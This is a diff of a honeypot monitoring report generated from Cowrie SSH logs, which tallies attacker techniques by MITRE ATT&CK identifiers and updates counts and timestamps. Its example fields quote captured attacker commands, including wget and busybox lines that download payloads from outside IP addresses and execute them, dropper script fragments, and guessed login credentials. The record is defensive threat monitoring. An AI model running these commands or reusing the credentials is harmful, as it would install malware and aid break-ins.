@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-02 18:02:02",
+  "generated": "2026-09-02 19:00:45",
   "totals": {
-    "commands": 537,
-    "login_failed": 1738,
-    "login_success": 141,
-    "sessions": 1933
+    "commands": 569,
+    "login_failed": 1781,
+    "login_success": 149,
+    "sessions": 1994
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1738,
+      "count": 1781,
       "examples": [
         "admin / admin",
         "admin / ruijie@123",
@@ -21,14 +21,14 @@
         "root / Info@123"
       ],
       "first": "2026-09-02T00:00:49.263609Z",
-      "last": "2026-09-02T18:01:39.753385Z",
-      "unique_ips": 219
+      "last": "2026-09-02T19:00:27.214583Z",
+      "unique_ips": 234
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 141,
+      "count": 149,
       "examples": [
         "admin / vertex25ektks123",
         "ubnt / password321",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-09-02T00:18:42.984434Z",
-      "last": "2026-09-02T17:57:46.257021Z",
-      "unique_ips": 121
+      "last": "2026-09-02T19:00:31.358458Z",
+      "unique_ips": 129
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 123,
+      "count": 138,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-02T00:49:42.143671Z",
-      "last": "2026-09-02T17:57:49.372864Z",
-      "unique_ips": 13
+      "last": "2026-09-02T18:16:34.390718Z",
+      "unique_ips": 14
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 58,
+      "count": 62,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,14 +69,14 @@
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht"
       ],
       "first": "2026-09-02T00:49:43.799681Z",
-      "last": "2026-09-02T13:25:40.991869Z",
-      "unique_ips": 13
+      "last": "2026-09-02T18:16:34.390718Z",
+      "unique_ips": 14
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 16,
+      "count": 17,
       "examples": [
         "uname -a",
         "#!/bin/sh\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /\n# \u6e05\u7406\u65e7\u6587\u4ef6\nrm -f x*\n# \u4e0b\u8f7d\u51fd\u6570: \u8fd4\u56de 0 \u8868\u793a\u6210\u529f\nget() {\n    wget -q -",
@@ -85,22 +85,22 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-02T00:44:23.808275Z",
-      "last": "2026-09-02T17:57:49.372864Z",
-      "unique_ips": 12
+      "last": "2026-09-02T18:22:35.754252Z",
+      "unique_ips": 13
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 11,
+      "count": 12,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "id",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-02T00:49:43.799681Z",
-      "last": "2026-09-02T17:57:49.372864Z",
-      "unique_ips": 11
+      "last": "2026-09-02T18:15:58.450794Z",
+      "unique_ips": 12
     },
     {
       "id": "T1059.004",
@@ -158,19 +158,19 @@
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      48
+      56
     ],
     [
       "system",
-      27
+      28
     ],
     [
       "shell",
-      26
+      27
     ],
     [
       "sh",
-      26
+      27
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -178,23 +178,23 @@
     ],
     [
       "enable",
-      10
+      11
     ],
     [
       "linuxshell",
-      8
+      9
     ],
     [
       "ping ;sh",
-      8
+      9
     ],
     [
       "cd /proc && cat self/cmdline",
-      8
+      9
     ],
     [
       "enablelinuxshell",
-      7
+      8
     ],
     [
       "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
